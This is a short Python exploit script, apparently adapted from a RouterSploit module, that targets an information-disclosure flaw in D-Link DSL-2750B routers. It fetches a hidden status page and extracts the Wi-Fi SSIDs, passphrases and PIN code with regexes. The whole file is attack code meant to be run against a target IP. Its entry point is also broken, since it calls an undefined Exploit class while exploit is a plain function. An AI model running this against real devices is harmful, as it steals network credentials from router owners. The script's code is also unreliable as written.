target = ""
# rsf exploit module
# description: Module exploits information disclosure in D-Link DSL-2750B devices
import re
import requests

def exploit(target, port=80):
    try:
        response = requests.get(f"http://{target}:{port}/hidden_info.html", timeout=5)
        if response.status_code == 200:
            creds = []
            data = ['2.4G SSID', '2.4G PassPhrase', '5G SSID', '5G PassPhrase', 'PIN Code']
            
            for d in data:
                regexp = f"<td nowrap><B>{d}:</B></td>\r\n\t\t\t<td>(.+?)</td>"
                val = re.findall(regexp, response.text)
                if val:
                    creds.append((d, val[0]))
            
            if creds:
                for item in creds:
                    print(f"{item[0]}: {item[1]}")
                return True
        return False
    except:
        return False

def check(target, port=80):
    try:
        response = requests.get(f"http://{target}:{port}/hidden_info.html", timeout=5)
        return response.status_code == 200 and "SSID" in response.text and "PassPhrase" in response.text
    except:
        return False



import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
